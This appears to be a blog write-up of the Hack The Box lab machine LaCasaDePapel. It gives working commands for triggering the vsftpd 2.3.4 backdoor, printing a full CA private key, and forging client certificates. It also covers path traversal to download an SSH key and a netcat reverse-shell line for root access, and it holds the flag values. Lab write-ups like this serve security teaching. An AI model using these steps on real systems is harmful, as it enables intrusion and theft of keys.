@@ -1,0 +1,365 @@
+---
+layout: default
+title: LaCasaDePapel
+---
+
+<h1>LaCasaDePapel</h1>
+<p class="date">27/07/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/lacasadepapel.png">
+
+<p><code>LaCasaDePapel</code> is an easy and great box to learn about certificates and <code>ssh</code> configuration. To escalate privileges, it's all about enumeration and finding the correct file.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>First run a <code>nmap</code> to see we have ports <code>21/ftp</code>, <code>22/ssh</code>, <code>80/http</code> and <code>443/https</code> open.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# nmap -sC -sV 10.10.10.131
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-03 11:10 EDT
+Nmap scan report for 10.10.10.131
+Host is up (0.52s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE  VERSION
+21/tcp  open  ftp      vsftpd 2.3.4
+22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)
+|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)
+|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)
+80/tcp  open  http?
+443/tcp open  ssl/http Node.js Express framework
+Service Info: OS: Unix
+</pre>
+
+<p>On port <code>80</code> we have the following website with a picture of the cast from the Netflix show <b>La casa de papel</b>.</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/1.png">
+
+<p>On the website we just seem to have the option to create an account to get a free trial and if we visit the site via <code>https</code> we get an error because we require a certificate to continue.</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/2.png">
+
+<p>Going back to our scan, we can see we have <code>vsftpd 2.3.4</code> running on port <code>21</code>. This version of <code>vsftpd</code> is known to have a backdoor, that causes the system to pop a shell in port <code>6200</code> when a user containing a smiley [ <code>:)</code> ] tries to login.</p> 
+
+<p>I automated the process with this simple python script to open the backdoor.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# cat openplz.py 
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.10.10.131", 21))
+s.send('USER caca:)\n')
+s.send('PASS pipi\n')
+s.close()
+</pre>
+
+<p>After triggering the backdoor we can connect to the shell on port <code>6200</code> via <code>nc</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# nc 10.10.10.131 6200
+(UNKNOWN) [10.10.10.131] 6200 (?) : Connection refused
+root@kali:~/htb/lacasadepapel# python openplz.py 
+root@kali:~/htb/lacasadepapel# nc 10.10.10.131 6200
+Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman
+</pre>
+
+<p>Here we don't have a regular shell, but some kind of PHP shell instead.</p>
+
+<p>After trying different functions I didn't find a way to execute commands on the system.</p>
+
+<pre class="prettyprint">
+exec('whoami')
+PHP Fatal error:  Call to undefined function exec() in Psy Shell code on line 1
+exec_shell('whoami')
+PHP Fatal error:  Call to undefined function exec_shell() in Psy Shell code on line 1
+system('whoami')
+PHP Fatal error:  Call to undefined function system() in Psy Shell code on line 1
+passthru('whoami')
+PHP Fatal error:  Call to undefined function passthru() in Psy Shell code on line 1
+</pre>
+
+<p>Using the command <code>help</code> we can see a the list of available custom commands on this shell.</p>
+
+<pre class="prettyprint">
+help
+  help       Show a list of commands. Type `help [foo]` for information about [foo].      Aliases: ?                     
+  ls         List local, instance or class variables, methods and constants.              Aliases: list, dir             
+  dump       Dump an object or primitive.                                                                                
+  doc        Read the documentation for an object, class, constant, method or property.   Aliases: rtfm, man             
+  show       Show the code for an object, class, constant, method or property.                                           
+  wtf        Show the backtrace of the most recent exception.                             Aliases: last-exception, wtf?  
+  whereami   Show where you are in the code.                                                                             
+  throw-up   Throw an exception or error out of the Psy Shell.                                                           
+  timeit     Profiles with a timer.                                                                                      
+  trace      Show the current call stack.                                                                                
+  buffer     Show (or clear) the contents of the code input buffer.                       Aliases: buf                   
+  clear      Clear the Psy Shell screen.                                                                                 
+  edit       Open an external editor. Afterwards, get produced code in input buffer.                                     
+  sudo       Evaluate PHP code, bypassing visibility restrictions.                                                       
+  history    Show the Psy Shell history.                                                  Aliases: hist                  
+  exit       End the current session and return to caller.                                Aliases: quit, q
+</pre>
+
+<p>If we <code>ls</code> we can see there's a local variable <code>$tokyo</code> declared.
+
+<pre class="prettyprint">
+ls
+Variables: $tokyo
+</pre>
+
+<p>Using <code>show</code> we can see its code.</p>
+
+<pre class="prettyprint">
+show $tokyo
+  > 2| class Tokyo {
+    3|  private function sign($caCert,$userCsr) {
+    4|    $caKey = file_get_contents('/home/nairobi/ca.key');
+    5|    $userCert = openssl_csr_sign($userCsr, $caCert, $caKey, 365, ['digest_alg'=>'sha256']);
+    6|    openssl_x509_export($userCert, $userCertOut);
+    7|    return $userCertOut;
+    8|  }
+    9| }
+</pre>
+
+<p>It's a function that signs certificates using a key in <code>/home/nairobi/ca.key</code>, so this could help us to access the <code>https</code> website we saw before which require a valid certificate.</p>
+
+<p>To generate one, first of all, let's retrieve the private key using <code>readfile</code>.</p>
+
+<pre class="prettyprint">
+readfile('/home/nairobi/ca.key')
+-----BEGIN PRIVATE KEY-----
+MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb
+7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/
+2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl
+uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M
+YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp
+s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us
+PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V
+Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89
+1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ
+/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+
+q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr
+uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd
+I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og
+7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE
+G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn
+sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH
+CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y
+sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI
+ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2
+zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/
+ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC
+9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M
+WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM
+7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR
+aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc
+53udBEzjt3WPqYGkkDknVhjD
+-----END PRIVATE KEY-----
+=> 1704
+</pre>
+
+<p>Now, we generate a certificate signing request using <code>openssl</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# openssl req -new -newkey rsa:2048 -nodes -keyout caca.key -out caca.csr
+Generating a RSA private key
+...................................................................................+++++
+...+++++
+writing new private key to 'caca.key'
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:
+Email Address []:
+
+Please enter the following 'extra' attributes
+to be sent with your certificate request
+A challenge password []:
+An optional company name []:
+</pre>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# cat caca.csr
+-----BEGIN CERTIFICATE REQUEST-----
+MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
+...
+NBCvwzLuqPl5u7bBbyPXr3am8kZkS9eAEzRnjay2
+-----END CERTIFICATE REQUEST-----
+</pre>
+
+<p>Now we need the website certificate, we can copy paste it when connecting to the site.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# openssl s_client -connect 10.10.10.131:443 -showcerts
+CONNECTED(00000003)
+Can't use SSL_get_servername
+depth=0 CN = lacasadepapel.htb, O = La Casa De Papel
+verify error:num=18:self signed certificate
+...
+</pre>
+
+<p>Or we can run the following command which will save it directly into a file.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# ex +'/BEGIN CERTIFICATE/,/END CERTIFICATE/p' <(echo | openssl s_client -showcerts -connect 10.10.10.131:443) -scq > casadepapel.crt
+</pre>
+
+<p>Having the csr, the cert and the key we can create our own public certificate.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# openssl x509 -req -in caca.csr -CA casadepapel.crt -CAkey ca.key -CAcreateserial -out pipi.crt -sha256
+Signature ok
+subject=C = AU, ST = Some-State, O = Internet Widgits Pty Ltd
+Getting CA Private Key
+</pre>
+
+<p>Since Firefox doesn't accept crt files, we create a p12 certificate using the key and the crt.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# openssl pkcs12 -export -in pipi.crt -inkey caca.key -out pipi.p12
+Enter Export Password:
+Verifying - Enter Export Password:
+</pre>
+
+<p>Import it on the certificate manager tab and we're ready to go.</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/3.png">
+
+<p>Now we're able to access the private area where we can download both seasons of the Netflix serie.</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/4.png">
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/5.png">
+
+<p>The URL to view the files is <code>https://10.10.10.131/?path=SEASON-1</code> and if we play with that <code>path</code> variable we can see it's possible to go to the parent directory using <code>?path=..</code>, where there's the user flag.</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/6.png">
+
+<p>Also, the URL to download a file has this structure <code>https://10.10.10.131/file/U0VBU09OLTEvMDEuYXZp</code>. If we decode that strange string in <code>base64</code> we'll see it's just the path of the file to download.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# echo U0VBU09OLTEvMDEuYXZp | base64 -d
+SEASON-1/01.avi
+</pre>
+
+<p>We just have to encode the path where the file is located.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# echo -n "../user.txt" | base64
+Li4vdXNlci50eHQ=
+</pre>
+
+<p>And replace the <code>base64</code> value (<code>https://10.10.10.131/file/Li4vdXNlci50eHQ=</code>).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# cat user.txt 
+<span flag="4dcbd172fc9c9ef2ff65c13448d9062d">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>Enumerating a bit, we should see that the folder <code>.ssh</code> contains a private key <code>id_rsa</code>. Encode the path to <code>base64</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# echo -n "../.ssh/id_rsa" | base64
+Li4vLnNzaC9pZF9yc2E=
+</pre>
+
+<p>Replace again the <code>base64</code> string (<code>https://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E=</code>) and download the key.</p>
+
+<p>Change the file permissions to be able to use it.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# chmod 600 id_rsa 
+</pre>
+
+<p>If we go to <code>?path=../../</code> we'll see we have the following users (we can also download <code>/etc/passwd</code>).</p>
+
+<img class="img-fluid" src="/static/img/htb/lacasadepapel/7.png">
+
+<p>Connecting via <code>ssh</code> with the obtained private key and those users, we should see the connection is established if we use <code>professor</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# ssh -i id_rsa professor@10.10.10.131
+
+ _             ____                  ____         ____                  _ 
+| |    __ _   / ___|__ _ ___  __ _  |  _ \  ___  |  _ \ __ _ _ __   ___| |
+| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \ | |_) / _` | '_ \ / _ \ |
+| |__| (_| | | |__| (_| \__ \ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |
+|_____\__,_|  \____\__,_|___/\__,_| |____/ \___| |_|   \__,_| .__/ \___|_|
+                                                            |_|       
+
+lacasadepapel [~]$ 
+</pre>
+
+<p>On our home directory, we have some files from <code>memcached</code> owned by <code>root</code>.</p>
+
+<pre class="prettyprint">
+lacasadepapel [~]$ ls -al
+total 24
+drwxr-sr-x    4 professo professo      4096 Mar  6 20:56 .
+drwxr-xr-x    7 root     root          4096 Feb 16 18:06 ..
+lrwxrwxrwx    1 root     professo         9 Nov  6 23:10 .ash_history -> /dev/null
+drwx------    2 professo professo      4096 Jan 31 21:36 .ssh
+-rw-r--r--    1 root     root            88 Jan 29 01:25 memcached.ini
+-rw-r-----    1 root     nobody         434 Jan 29 01:24 memcached.js
+drwxr-sr-x    9 root     professo      4096 Jan 29 01:31 node_modules
+</pre>
+
+<p>On the <code>ini</code> file there's the command which should be executed to run <code>memcached</code>.</p>
+
+<pre class="prettyprint">
+lacasadepapel [~]$ cat memcached.ini
+[program:memcached]
+command = sudo -u nobody /usr/bin/node /home/professor/memcached.js
+</pre>
+
+<p>We can't modify the content of the file because its permissions, but we do can replace it.</p>
+
+<p>Change the filename of the original ini file.</p>  
+
+<pre class="prettyprint">
+lacasadepapel [~]$ mv memcached.ini memcached.old
+</pre>
+
+<p>And then, create another one but now with a <code>nc</code> reverse shell to our machine.</p>
+
+<pre class="prettyprint">
+lacasadepapel [~]$ echo -ne "[program:memcached]\ncommand = nc 10.10.16.43 6969 -e /bin/bash" > memcached.ini
+</pre>
+
+<p>When the service tries to run again, if we were listening on the specified port we should receive a shell from <code>root</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/lacasadepapel# nc -nlvp 6969
+listening on [any] 6969 ...
+connect to [10.10.16.43] from (UNKNOWN) [10.10.10.131] 38783
+whoami
+root
+</pre>
+
+<p>And now we're able to read the <code>root</code> flag.</p>
+
+<pre class="prettyprint">
+cat /root/root.txt
+<span flag="586979c48efbef5909a23750cc07f511">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
